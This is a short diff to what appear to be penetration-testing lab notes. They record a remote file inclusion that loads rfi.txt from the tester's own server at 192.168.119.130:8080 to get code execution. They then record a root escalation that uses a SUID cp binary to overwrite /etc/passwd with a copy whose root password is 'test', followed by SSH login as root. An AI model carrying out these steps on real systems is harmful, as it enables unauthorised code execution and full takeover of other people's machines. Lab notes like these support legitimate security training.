@@ -5,3 +5,11 @@ NOTES
 RFI on web server
 cant get shell but can get rce with ./rfi.txt
 http://10.11.1.35/section.php?page=http://192.168.119.130:8080/rfi.txt
+
+suid binaries -> cp
+can overwrite /etc/passwd with a malicious copy with cp
+./passwd -> root hash == test
+upload ./passwd to victim
+	cp /tmp/passwd_bad /etc/passwd
+ssh root@ip
+	password is test
